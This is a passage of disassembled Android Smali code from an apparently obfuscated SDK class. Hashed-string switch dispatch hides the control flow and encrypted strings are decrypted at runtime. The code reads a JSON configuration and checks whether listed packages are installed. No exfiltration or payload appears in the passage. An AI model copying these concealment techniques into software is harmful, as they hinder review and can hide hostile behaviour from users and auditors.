    const-string v0, "\u06da\u06e7\u06e6\u06d9\u06e1\u06e7\u06dc\u06db\u06db\u06e5\u06d8\u06d8\u06ec\u06d8\u06d9\u06dc\u06e5\u06e7\u06da\u06df\u06eb\u06e8\u06da\u06dc\u06d8\u06e4\u06e2\u06ec\u06da\u06d8\u06d8\u06e0\u06db\u06d6\u06e6\u06d9\u06e5\u06e5\u06e7\u06d8\u06e8\u06d9\u06e6"

    :goto_6
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v3

    sparse-switch v7, :sswitch_data_6

    goto :goto_6

    :sswitch_15
    const v7, 0x2f3b1f85

    const-string v0, "\u06ec\u06db\u06e5\u06d8\u06e4\u06e5\u06d6\u06d9\u06e1\u06d7\u06eb\u06e2\u06d6\u06e7\u06d7\u06e6\u06eb\u06df\u06df\u06ec\u06d6\u06db\u06e0\u06df\u06ec\u06df\u06db\u06d6\u06d8\u06dc\u06e0\u06d8"

    :goto_7
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_7

    goto :goto_7

    :sswitch_16
    if-eqz v1, :cond_3

    const-string v0, "\u06da\u06d6\u06e5\u06d8\u06eb\u06e7\u06e1\u06e2\u06d8\u06e4\u06ec\u06d9\u06da\u06ec\u06e6\u06e6\u06d8\u06da\u06d7\u06da\u06eb\u06d7\u06d8\u06d7\u06d8\u06d8\u06d7\u06e8\u06d8\u06d6\u06dc\u06d6\u06d8\u06db\u06e2\u06e6\u06eb\u06e8\u06e7\u06d8\u06e2\u06da\u06e8\u06d8\u06e5\u06e6\u06df\u06e6\u06d7\u06e2\u06d9\u06e4"

    goto :goto_7

    :sswitch_17
    const-string v0, "\u06d7\u06e2\u06dc\u06e6\u06db\u06df\u06e2\u06d8\u06ec\u06dc\u06d6\u06e5\u06d8\u06d9\u06ec\u06e1\u06df\u06e8\u06da\u06e5\u06e0\u06e8\u06d8\u06dc\u06dc\u06d6\u06e2\u06e7\u06e2\u06e1\u06df\u06e8"

    goto :goto_6

    :cond_3
    const-string v0, "\u06d6\u06eb\u06e8\u06e8\u06dc\u06e8\u06db\u06df\u06e4\u06d9\u06e0\u06db\u06d6\u06db\u06e7\u06d9\u06e1\u06ec\u06e7\u06da\u06e8\u06d8\u06e5\u06d6\u06e0\u06df\u06e5\u06e7\u06e8\u06ec\u06e5\u06d8\u06e5\u06e8\u06d8\u06d8\u06da\u06db\u06e6\u06d8\u06e8\u06da\u06d6\u06d8\u06dc\u06dc\u06d8\u06d8\u06da\u06d6\u06e1\u06e2\u06e2\u06e7\u06ec\u06e7\u06d8\u06d8\u06d7\u06e5\u06e8"

    goto :goto_7

    :sswitch_18
    const-string v0, "\u06e1\u06e7\u06e8\u06d8\u06ec\u06e7\u06e0\u06e4\u06df\u06e1\u06d8\u06e6\u06dc\u06dc\u06d8\u06e8\u06df\u06e1\u06e0\u06dc\u06e6\u06d8\u06dc\u06e4\u06e0\u06e2\u06e1\u06dc\u06d8\u06e0\u06ec\u06dc\u06d8\u06e8\u06db\u06e4\u06e4\u06e8\u06dc\u06d8\u06e1\u06d8\u06eb\u06e1\u06eb\u06d6\u06d7\u06e0\u06e1\u06db\u06e6\u06d8\u06ec\u06e0\u06d7"

    goto :goto_7

    :sswitch_19
    const-string v0, "\u06ec\u06e8\u06e4\u06df\u06dc\u06d9\u06ec\u06e5\u06d8\u06eb\u06e2\u06e7\u06df\u06e0\u06d9\u06db\u06d8\u06e6\u06db\u06da\u06ec\u06da\u06e1\u06da\u06e7\u06d9\u06ec\u06d6\u06eb\u06e4\u06e6\u06e8\u06d8\u06d8\u06e6\u06e6\u06e8\u06d9\u06d8\u06d8\u06d8\u06d6\u06e7\u06d8\u06df\u06e0\u06db\u06e1\u06d6\u06e7\u06e1\u06e2\u06db\u06d8\u06e7\u06e5\u06d8"
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_6

    :sswitch_1a
    const-string v0, "\u06d6\u06e7\u06d8\u06e6\u06d7\u06d6\u06e5\u06ec\u06e5\u06e8\u06e5\u06df\u06d8\u06e6\u06e2\u06ec\u06da\u06ec\u06db\u06e2\u06e8\u06d8\u06d8\u06e2\u06e6\u06e7\u06df\u06df\u06dc\u06e2\u06da\u06d7\u06e2\u06dc\u06d8\u06eb\u06e8\u06d8"

    goto :goto_6

    :sswitch_1b
    const v1, 0x4c7798fa    # 6.4906216E7f

    const-string v0, "\u06ec\u06da\u06eb\u06db\u06e4\u06d9\u06e4\u06df\u06e4\u06e7\u06e8\u06d8\u06d8\u06e0\u06d7\u06e4\u06e7\u06eb\u06ec\u06d6\u06dc\u06d8\u06ec\u06da\u06e8\u06da\u06d9\u06d7\u06e8\u06e1\u06d6\u06d8\u06e1\u06e7\u06d6\u06d8\u06e1\u06e4\u06d6\u06d8\u06db\u06d8\u06e5\u06e0\u06eb\u06e5\u06d6\u06d9\u06e6\u06dc\u06e4\u06e1"

    :goto_8
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v1

    sparse-switch v3, :sswitch_data_8

    goto :goto_8

    :sswitch_1c
    const-string v0, "\u06eb\u06e1\u06d6\u06d7\u06eb\u06e6\u06e5\u06d8\u06e6\u06d8\u06e5\u06e1\u06da\u06e2\u06e0\u06db\u06ec\u06d7\u06db\u06e5\u06e8\u06eb\u06e8\u06e8\u06d7\u06e0\u06e6\u06db\u06e1\u06d7\u06db\u06e1\u06dc\u06da\u06e8\u06db\u06dc\u06dc\u06e2\u06dc\u06df\u06dc\u06e2\u06db\u06eb\u06e8\u06e7\u06e0\u06d8\u06d8\u06e7\u06da\u06e8\u06d8\u06e4\u06e6\u06e4"

    goto :goto_8

    :sswitch_1d
    const-string v0, "\u06df\u06e2\u06da\u06e8\u06db\u06e5\u06d8\u06e1\u06db\u06e5\u06e2\u06eb\u06db\u06e5\u06e1\u06e6\u06e1\u06d7\u06eb\u06d7\u06eb\u06e8\u06e8\u06eb\u06d8\u06d8\u06e2\u06e2\u06e4\u06e5\u06e4\u06e4\u06d9\u06d8\u06dc\u06d8\u06e5\u06e7\u06da\u06da\u06df\u06df\u06df\u06e2\u06db"

    goto :goto_8

    :sswitch_1e
    const v3, -0x344426a

    const-string v0, "\u06d9\u06e6\u06e5\u06d8\u06da\u06d9\u06d8\u06e8\u06df\u06df\u06e5\u06df\u06e1\u06e5\u06e7\u06d6\u06d9\u06da\u06e5\u06d8\u06e5\u06d8\u06e4\u06da\u06d7\u06eb\u06db\u06d8\u06e7\u06d8\u06d6\u06d8\u06d8\u06e0\u06e0\u06ec\u06d6\u06e5\u06e6\u06d8"

    :goto_9
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v3

    sparse-switch v7, :sswitch_data_9

    goto :goto_9

    :sswitch_1f
    const-string v0, "\u06db\u06e6\u06d7\u06dc\u06e0\u06d8\u06d8\u06e1\u06dc\u06e4\u06df\u06ec\u06d6\u06e1\u06db\u06e8\u06e8\u06e5\u06dc\u06d8\u06ec\u06d8\u06e1\u06df\u06db\u06dc\u06dc\u06eb\u06eb\u06d9\u06df\u06e6\u06d8\u06eb\u06da\u06d9\u06e8\u06e6\u06d8"

    goto :goto_9

    :cond_4
    const-string v0, "\u06d9\u06e0\u06dc\u06da\u06e8\u06e5\u06ec\u06d8\u06e1\u06d8\u06ec\u06e4\u06e6\u06d8\u06e1\u06d7\u06d6\u06d8\u06e4\u06d8\u06d9\u06e7\u06e1\u06d9\u06eb\u06e7\u06d8\u06db\u06eb\u06d8\u06d8\u06ec\u06e2\u06e6\u06d8\u06da\u06e6\u06ec\u06d8\u06d9\u06e1\u06df\u06dc\u06e8\u06da\u06ec\u06d6\u06df\u06e1\u06e7\u06d8\u06e7\u06e8\u06e2"

    goto :goto_9

    :sswitch_20
    if-eqz v6, :cond_4

    const-string v0, "\u06e6\u06e1\u06e0\u06d7\u06da\u06d6\u06d8\u06e0\u06e0\u06dc\u06e2\u06db\u06e1\u06e4\u06e5\u06d6\u06d8\u06d9\u06e2\u06e7\u06d6\u06e6\u06e7\u06d8\u06df\u06df\u06d8\u06e4\u06df\u06d6\u06eb\u06e8\u06e8\u06d8\u06e2\u06dc\u06d7\u06d6\u06df\u06e5\u06d8\u06e1\u06da\u06e2\u06e8\u06e1\u06e1"

    goto :goto_9

    :sswitch_21
    const-string v0, "\u06e0\u06df\u06db\u06e2\u06d7\u06db\u06df\u06e8\u06e5\u06dc\u06e6\u06e5\u06d8\u06e2\u06e7\u06e1\u06dc\u06d7\u06d7\u06e1\u06d6\u06d9\u06e7\u06ec\u06dc\u06d8\u06d6\u06ec\u06e0\u06da\u06e1\u06d6\u06d6\u06e1\u06d6\u06d7\u06d9\u06e8\u06e7\u06e1\u06d9\u06e6\u06e2\u06e1\u06ec\u06d6\u06d6\u06d8\u06d7\u06ec\u06e1"

    goto :goto_8

    :sswitch_22
    const v1, -0x1871fae5

    :try_start_2
    const-string v0, "\u06e2\u06ec\u06df\u06d9\u06e6\u06d6\u06e7\u06e2\u06e2\u06e1\u06e5\u06eb\u06e7\u06e5\u06dc\u06d8\u06e4\u06eb\u06e5\u06da\u06e1\u06dc\u06e6\u06d6\u06e1\u06d8\u06da\u06dc\u06e1\u06e8\u06ec\u06d9"

    :goto_a
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v1

    sparse-switch v3, :sswitch_data_a

    goto :goto_a

    :sswitch_23
    const-string v0, "\u06d6\u06dc\u06e8\u06d8\u06d7\u06e1\u06da\u06ec\u06e0\u06d9\u06e8\u06ec\u06e6\u06d9\u06e7\u06e1\u06d8\u06d6\u06e8\u06d6\u06d6\u06e2\u06eb\u06d8\u06ec\u06e2\u06e5\u06e7\u06d8\u06e8\u06da\u06e7\u06da\u06e1\u06e8\u06e6\u06e4\u06d7\u06df\u06dc\u06ec\u06e7\u06da\u06e1\u06d8\u06e2\u06e8\u06d7\u06e1\u06ec\u06e5"

    goto :goto_a

    :sswitch_24
    const-string v0, "\u06df\u06d7\u06ec\u06e8\u06e0\u06d6\u06d8\u06e2\u06e8\u06e1\u06d8\u06e7\u06da\u06e6\u06e0\u06eb\u06e6\u06d6\u06dc\u06eb\u06e6\u06d7\u06e6\u06e5\u06ec\u06ec\u06e6\u06e0\u06e4\u06ec\u06da\u06d6\u06ec\u06e8\u06d8\u06e7\u06d7\u06da\u06e2\u06da\u06da\u06dc\u06ec\u06d6\u06d8\u06d9\u06da\u06e5\u06eb\u06e6\u06d8\u06d8\u06e2\u06e2\u06e6\u06e1\u06d8\u06e5"

    goto :goto_a

    :sswitch_25
    const v3, 0x1125229d

    const-string v0, "\u06da\u06e5\u06d6\u06df\u06e8\u06eb\u06e0\u06e5\u06e1\u06d8\u06e8\u06eb\u06d7\u06ec\u06df\u06e8\u06d8\u06dc\u06ec\u06e8\u06d8\u06e5\u06d6\u06e5\u06d8\u06e1\u06e2\u06eb\u06d9\u06e1\u06e6\u06e6\u06ec\u06e8\u06e8\u06dc\u06d8\u06d6\u06dc\u06d8"

    :goto_b
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v3

    sparse-switch v7, :sswitch_data_b

    goto :goto_b

    :sswitch_26
    invoke-virtual {v6}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-lez v0, :cond_5

    const-string v0, "\u06e6\u06d7\u06d8\u06e4\u06e6\u06d8\u06ec\u06e5\u06d7\u06e0\u06d9\u06e8\u06dc\u06d6\u06d8\u06d8\u06d6\u06e4\u06d6\u06db\u06e2\u06dc\u06e7\u06e4\u06db\u06eb\u06eb\u06dc\u06e8\u06dc\u06e6\u06d8\u06e8\u06ec\u06e1\u06e7\u06e2\u06d8\u06d8\u06e7\u06e2\u06e8\u06e8\u06e0\u06dc"

    goto :goto_b

    :cond_5
    const-string v0, "\u06db\u06e8\u06e6\u06d8\u06e1\u06d8\u06e0\u06e2\u06e1\u06df\u06db\u06df\u06ec\u06d9\u06df\u06d7\u06d6\u06da\u06d9\u06e4\u06e2\u06da\u06ec\u06d7\u06d8\u06d8\u06dc\u06e6\u06d7\u06e1\u06e6\u06e5\u06d8\u06db\u06e6\u06ec\u06e4\u06da\u06eb\u06eb\u06e8\u06d6\u06e0\u06eb\u06df\u06da\u06d8\u06eb\u06ec\u06ec\u06da\u06dc\u06db\u06e8"

    goto :goto_b

    :sswitch_27
    const-string v0, "\u06da\u06e1\u06da\u06e8\u06e2\u06e5\u06d8\u06d8\u06e8\u06d6\u06e2\u06e6\u06df\u06e0\u06e6\u06dc\u06d6\u06da\u06df\u06e2\u06d8\u06e0\u06e0\u06eb\u06e6\u06d8\u06d7\u06eb\u06d8\u06e8\u06eb\u06e1\u06df\u06db\u06ec\u06e4\u06e4\u06eb"

    goto :goto_b

    :sswitch_28
    const-string v0, "\u06df\u06d9\u06db\u06ec\u06e6\u06ec\u06df\u06d6\u06e8\u06dc\u06e7\u06e2\u06e7\u06da\u06d7\u06dc\u06db\u06e8\u06da\u06e5\u06e7\u06db\u06e0\u06e8\u06d8\u06db\u06da\u06e1\u06d8\u06e4\u06e1\u06d8\u06db\u06ec\u06e2\u06d9\u06e8\u06da\u06d9\u06e6\u06e1\u06e0\u06e8\u06d9\u06d9\u06dc\u06dc\u06d8\u06e5\u06e6\u06e6\u06d8"

    goto :goto_a

    :sswitch_29
    const/4 v0, 0x0

    move v3, v0

    :goto_c
    const v1, -0x67bb0cea

    const-string v0, "\u06e6\u06e8\u06e8\u06e5\u06db\u06e6\u06d8\u06e7\u06da\u06d8\u06e5\u06ec\u06e4\u06d6\u06ec\u06dc\u06e7\u06e8\u06e2\u06e6\u06da\u06d8\u06d8\u06ec\u06e7\u06df\u06eb\u06e2\u06e5\u06e7\u06e4\u06e0\u06e7\u06e8\u06ec\u06db\u06e2\u06db\u06e4\u06e8\u06e2\u06e8\u06d7\u06e8\u06df\u06d9\u06d7\u06e0\u06e2\u06df\u06d8\u06e1\u06d8\u06db\u06d8\u06d6\u06d8"

    :goto_d
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v7

    xor-int/2addr v7, v1

    sparse-switch v7, :sswitch_data_c

    goto :goto_d

    :sswitch_2a
    const-string v0, "27u5GQhlCOFl67dvXU53ABO5qBIITglZBfnjFkEuPB1o45ViTER5OQ27uCQJcD0=\n"

    const-string v1, "gFwFiu3IkLw=\n"

    invoke-static {v0, v1}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "bMY=\n"

    const-string v3, "A63Zj2VY/bg=\n"

    invoke-static {v1, v3}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, LCu7y/sdk/x7;->logToFloatingWindow(Ljava/lang/String;Ljava/lang/String;)V

    sput-object v5, LCu7y/sdk/e5;->b:Lorg/json/JSONObject;

    const-string v0, "FQ/UCx4=\n"

    const-string v1, "cWq2fnnhs7g=\n"

    invoke-static {v0, v1}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v1, 0x0

    invoke-virtual {v5, v0, v1}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v0

    sput-boolean v0, LCu7y/sdk/e5;->c:Z

    const-string v0, "61BiFh96iKvgSmoBHV6Y\n"

    const-string v1, "iTwDdXQ7698=\n"

    invoke-static {v0, v1}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v5, v0}, Lorg/json/JSONObject;->optJSONArray(Ljava/lang/String;)Lorg/json/JSONArray;

    move-result-object v3

    const v1, -0x717f907e

    const-string v0, "\u06db\u06df\u06ec\u06da\u06da\u06e1\u06d8\u06d9\u06e0\u06d8\u06d8\u06e8\u06e1\u06d8\u06d8\u06e7\u06e6\u06e5\u06d9\u06d8\u06d6\u06d8\u06dc\u06e0\u06e5\u06e5\u06e1\u06e8\u06db\u06eb\u06d6\u06d8\u06e8\u06e4\u06e1\u06e5\u06d6\u06e6\u06e4\u06e5\u06e5\u06d8\u06e5\u06dc\u06ec\u06e4\u06e1\u06e5\u06d8\u06e2\u06d9\u06e6\u06e0\u06e7\u06e6\u06d7\u06da\u06e1\u06d8\u06ec\u06e1"

    :goto_e
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v4

    xor-int/2addr v4, v1

    sparse-switch v4, :sswitch_data_d

    goto :goto_e

    :sswitch_2b
    const v4, -0x76b57d35

    const-string v0, "\u06d7\u06e1\u06e7\u06ec\u06e5\u06d6\u06d8\u06e1\u06e5\u06db\u06da\u06d7\u06e4\u06ec\u06ec\u06d8\u06d8\u06ec\u06e2\u06d6\u06e6\u06dc\u06e1\u06d8\u06e0\u06d8\u06e5\u06d8\u06d8\u06e0\u06e1\u06e6\u06e1\u06e7\u06d9\u06df\u06d7\u06d7\u06ec\u06e7\u06db\u06df\u06e4\u06d7\u06d8\u06dc\u06d8\u06e4\u06e8\u06dc\u06e5\u06e4\u06e8\u06d8\u06e1\u06db\u06e4\u06d9\u06e1\u06db"

    :goto_f
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v6

    xor-int/2addr v6, v4

    sparse-switch v6, :sswitch_data_e

    goto :goto_f

    :sswitch_2c
    const-string v0, "\u06d7\u06df\u06df\u06e0\u06ec\u06da\u06e1\u06e7\u06e1\u06ec\u06e1\u06e1\u06d8\u06e6\u06e5\u06e7\u06d8\u06d7\u06e2\u06da\u06e6\u06e1\u06dc\u06eb\u06eb\u06d6\u06db\u06d8\u06e4\u06e1\u06ec\u06e8\u06e0\u06e5\u06e5\u06dc\u06e7\u06d8\u06ec\u06db\u06e1\u06d8\u06e6\u06d8\u06e4\u06dc\u06df\u06e6\u06ec\u06d7\u06e8"

    goto :goto_e

    :sswitch_2d
    const-string v0, "\u06dc\u06eb\u06e2\u06e4\u06e8\u06e5\u06d8\u06eb\u06eb\u06e8\u06da\u06e8\u06e1\u06e6\u06e6\u06e8\u06d9\u06eb\u06dc\u06d6\u06ec\u06db\u06eb\u06e8\u06e6\u06da\u06df\u06d9\u06d8\u06da\u06e8\u06eb\u06e0\u06d8\u06d8\u06e8\u06e7\u06e8\u06d8\u06e8\u06e5\u06d8\u06d8\u06e5\u06eb\u06e2"

    goto :goto_d

    :sswitch_2e
    const v7, -0x4315332d

    const-string v0, "\u06e8\u06df\u06db\u06dc\u06dc\u06e0\u06eb\u06df\u06d6\u06d6\u06e6\u06e2\u06d9\u06df\u06d6\u06d8\u06ec\u06e7\u06e8\u06d8\u06e4\u06e5\u06d9\u06e5\u06dc\u06e8\u06e6\u06eb\u06e8\u06d8\u06e8\u06d7\u06df\u06d9\u06df\u06d9\u06e1\u06d9\u06d6\u06e6\u06e7\u06e1\u06e7\u06dc\u06df\u06e7\u06e8\u06d8\u06d6\u06e6\u06eb"

    :goto_10
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_f

    goto :goto_10

    :sswitch_2f
    const-string v0, "\u06ec\u06ec\u06ec\u06dc\u06d6\u06da\u06e5\u06e0\u06e5\u06d8\u06e7\u06d8\u06d9\u06e6\u06e7\u06d8\u06d8\u06e7\u06d6\u06ec\u06e0\u06d8\u06d9\u06e6\u06d9\u06eb\u06e0\u06e0\u06d9\u06eb\u06d6\u06d8\u06e1\u06d9\u06e8\u06d8\u06e1\u06e1\u06e0\u06d8\u06e8\u06e6\u06e1\u06d8\u06d8"

    goto :goto_d

    :cond_6
    const-string v0, "\u06e8\u06e7\u06e8\u06eb\u06dc\u06ec\u06df\u06eb\u06e5\u06dc\u06e4\u06ec\u06e2\u06e8\u06d9\u06e6\u06e7\u06e8\u06d8\u06d8\u06d6\u06d6\u06dc\u06d8\u06dc\u06e5\u06eb\u06e4\u06e4\u06e2"

    goto :goto_10

    :sswitch_30
    invoke-virtual {v6}, Lorg/json/JSONArray;->length()I

    move-result v0

    if-ge v3, v0, :cond_6

    const-string v0, "\u06e4\u06e4\u06e5\u06d8\u06ec\u06dc\u06e5\u06e6\u06da\u06eb\u06dc\u06e2\u06ec\u06e5\u06e4\u06ec\u06df\u06dc\u06d6\u06e8\u06d9\u06d7\u06d9\u06db\u06e8\u06e1\u06d8\u06da\u06db\u06e4\u06e1\u06e8\u06e7\u06d8\u06e0\u06d6\u06e6\u06ec\u06e2\u06df\u06db\u06df\u06da\u06e2\u06e5\u06d7\u06df\u06e5\u06d8\u06da\u06e5\u06d9\u06e8\u06e8\u06e7"

    goto :goto_10

    :sswitch_31
    const-string v0, "\u06e5\u06df\u06e5\u06d8\u06d6\u06e1\u06e5\u06df\u06e4\u06e6\u06d8\u06d7\u06d9\u06d9\u06e5\u06e7\u06ec\u06df\u06e0\u06e5\u06d8\u06ec\u06e0\u06e6\u06eb\u06e6\u06e8\u06d8\u06d6\u06e2\u06eb\u06e6\u06d6\u06d6\u06d8\u06e1\u06e8\u06da\u06e7\u06e4\u06d8\u06da\u06e8\u06e7\u06d8\u06e0\u06e7\u06e1"

    goto :goto_10

    :sswitch_32
    const-string v0, "\u06ec\u06d9\u06eb\u06eb\u06d8\u06d6\u06e5\u06e0\u06d8\u06d8\u06e5\u06d6\u06e0\u06ec\u06e2\u06e7\u06ec\u06dc\u06e7\u06db\u06df\u06df\u06d9\u06e4\u06db\u06da\u06e0\u06e6\u06e0\u06e6\u06d8\u06ec\u06ec\u06d8\u06d8\u06dc\u06e8\u06d7\u06d7\u06df\u06d8\u06d8\u06ec\u06e5\u06db"

    goto :goto_d

    :sswitch_33
    invoke-virtual {v6, v3}, Lorg/json/JSONArray;->optJSONObject(I)Lorg/json/JSONObject;

    move-result-object v1

    const v7, -0x3e567adb

    const-string v0, "\u06e7\u06e5\u06e6\u06df\u06db\u06e8\u06e0\u06e0\u06d6\u06eb\u06e7\u06e7\u06ec\u06da\u06d6\u06d8\u06e1\u06d7\u06d6\u06d8\u06da\u06e8\u06da\u06d9\u06ec\u06d8\u06d9\u06db\u06e5\u06d8\u06db\u06e6\u06df\u06e7\u06d7\u06da\u06e1\u06e8\u06e7\u06e1\u06d6\u06e5\u06d8\u06e8\u06dc\u06e6\u06d8\u06ec\u06df\u06dc\u06d7\u06df\u06e5\u06d8\u06ec\u06df\u06dc\u06eb\u06e6\u06eb"

    :goto_11
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v8

    xor-int/2addr v8, v7

    sparse-switch v8, :sswitch_data_10

    goto :goto_11

    :sswitch_34
    const-string v0, "tlfj6EhAnReoV+3m\n"

    const-string v7, "xjaAgykn+Eg=\n"

    invoke-static {v0, v7}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lorg/json/JSONObject;->optString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v0, "HpRIEeyuTrEDgVk=\n"

    const-string v8, "evE8dI/aEcU=\n"

    invoke-static {v0, v8}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v8, 0x0

    invoke-virtual {v1, v0, v8}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v8

    const-string v0, "y50lJoH4CJPTjjQ=\n"

    const-string v9, "qv5RT+6WV+c=\n"

    invoke-static {v0, v9}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const/4 v9, 0x0

    invoke-virtual {v1, v0, v9}, Lorg/json/JSONObject;->optInt(Ljava/lang/String;I)I

    move-result v9

    const-string v0, "/yf7U8/pdGQ=\n"

    const-string v10, "i06LDLuMDBA=\n"

    invoke-static {v0, v10}, LCu7y/sdk/y7;->decrypt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v10, ""

    invoke-virtual {v1, v0, v10}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    move-result-object v10

    const/4 v0, 0x0

    :try_start_3
    invoke-virtual {v4, v7, v0}, Landroid/content/pm/PackageManager;->getPackageInfo(Ljava/lang/String;I)Landroid/content/pm/PackageInfo;
    :try_end_3
    .catch Landroid/content/pm/PackageManager$NameNotFoundException; {:try_start_3 .. :try_end_3} :catch_0
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1

    const/4 v0, 0x1

    :goto_12
    const v11, 0x6a6b0c6e

    const-string v1, "\u06db\u06da\u06eb\u06dc\u06eb\u06e8\u06d8\u06d6\u06e7\u06e1\u06eb\u06e4\u06e5\u06d8\u06e1\u06d6\u06d6\u06e1\u06d8\u06d6\u06d8\u06dc\u06e4\u06e2\u06eb\u06e8\u06e7\u06e0\u06d6\u06e6\u06ec\u06dc\u06d8\u06e8\u06db\u06e8\u06db\u06d6\u06e4\u06d6\u06d8\u06d8\u06e8\u06ec\u06e2\u06e6\u06e1\u06e1\u06d8\u06dc\u06db\u06d6\u06d8\u06e0\u06d7\u06e6\u06d8\u06e1\u06d8\u06da"

    :goto_13
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v12

    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_11

    goto :goto_13

    :sswitch_35
    const v11, -0x5dac5c2b

    const-string v1, "\u06e4\u06e4\u06e1\u06d9\u06e2\u06d8\u06ec\u06da\u06e2\u06d7\u06e5\u06eb\u06e4\u06db\u06e0\u06eb\u06e5\u06e1\u06e6\u06e4\u06ec\u06df\u06eb\u06d8\u06e5\u06d8\u06d8\u06dc\u06da\u06e8\u06db\u06e1\u06d8\u06eb\u06eb\u06d7\u06e1\u06e7\u06db\u06da\u06e6\u06e4\u06e0\u06db\u06d8\u06d9\u06d7\u06e5\u06e6\u06e0\u06e1\u06d8\u06e6\u06dc\u06e2"

    :goto_14
    invoke-virtual {v1}, Ljava/lang/String;->hashCode()I

    move-result v12

    xor-int/2addr v12, v11

    sparse-switch v12, :sswitch_data_12

    goto :goto_14

    :sswitch_36
    const-string v1, "\u06e1\u06e0\u06d8\u06db\u06e4\u06e0\u06d9\u06d7\u06ec\u06eb\u06e4\u06e4\u06e4\u06dc\u06e5\u06d6\u06df\u06d6\u06e8\u06e6\u06db\u06e1\u06e8\u06e7\u06e0\u06df\u06d8\u06e7\u06d6\u06d6\u06eb\u06da\u06d6\u06e4\u06e5\u06e1\u06d7\u06e4\u06e4\u06db\u06e6\u06d8\u06e6\u06e2\u06ec\u06e5\u06d8"

    goto :goto_14

    :sswitch_37
    :try_start_4
    const-string v0, "\u06d9\u06d9\u06da\u06d8\u06da\u06e4\u06e4\u06e4\u06e4\u06e2\u06d8\u06d8\u06e1\u06e5\u06d8\u06e2\u06d6\u06e5\u06d8\u06e1\u06e7\u06e1\u06e8\u06db\u06db\u06e6\u06ec\u06e0\u06df\u06e5\u06e6\u06df\u06e8\u06d8\u06e4\u06ec\u06e5"

    goto :goto_11

    :sswitch_38
    const v8, 0x5df4234f

    const-string v0, "\u06d7\u06e0\u06e8\u06d8\u06ec\u06e6\u06e8\u06e8\u06e4\u06e5\u06e2\u06e1\u06ec\u06e1\u06d6\u06d7\u06d7\u06da\u06da\u06db\u06d8\u06e4\u06d6\u06d8\u06e4\u06e0\u06d9\u06d6\u06e5\u06d8\u06d7\u06da\u06e8\u06d9\u06d8\u06e5\u06d8\u06e4\u06e8\u06d6\u06db\u06d7\u06d8\u06d8"

    :goto_15
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v9

    xor-int/2addr v9, v8

    sparse-switch v9, :sswitch_data_13

    goto :goto_15

    :sswitch_39
    const-string v0, "\u06da\u06da\u06e1\u06d8\u06da\u06e2\u06e1\u06d8\u06eb\u06eb\u06e1\u06e4\u06e6\u06e7\u06db\u06e1\u06d8\u06d7\u06df\u06db\u06e0\u06df\u06e2\u06ec\u06e1\u06e8\u06d9\u06dc\u06e0\u06d6\u06e8\u06d7\u06e4\u06e1\u06e0\u06e1\u06dc\u06d7\u06eb\u06e1\u06ec\u06ec\u06e5\u06dc\u06e5\u06e7\u06da\u06da\u06e8\u06d9\u06db\u06e4\u06e0\u06e5\u06d8"

    goto :goto_15

    :cond_7
    const-string v0, "\u06e0\u06d7\u06e5\u06d8\u06dc\u06da\u06e1\u06d8\u06e6\u06e4\u06e8\u06e4\u06d9\u06e4\u06df\u06e5\u06e5\u06e5\u06eb\u06e5\u06d8\u06e1\u06e7\u06dc\u06e7\u06dc\u06e6\u06e8\u06e5\u06d9\u06e4\u06d6"

    goto :goto_15

    :sswitch_3a
    if-nez v1, :cond_7

    const-string v0, "\u06e0\u06e2\u06dc\u06d8\u06dc\u06e7\u06e7\u06d8\u06d8\u06e5\u06db\u06d7\u06dc\u06d7\u06da\u06e1\u06e8\u06db\u06dc\u06eb\u06d9\u06e5\u06e8\u06dc\u06df\u06dc\u06da\u06e6\u06d7\u06d7\u06e8\u06da\u06e0\u06db\u06d8\u06e5\u06eb\u06e5\u06e7\u06d8\u06d9\u06dc\u06e5\u06d8\u06eb\u06e4\u06e6\u06e1\u06df\u06da"

    goto :goto_15

    :sswitch_3b
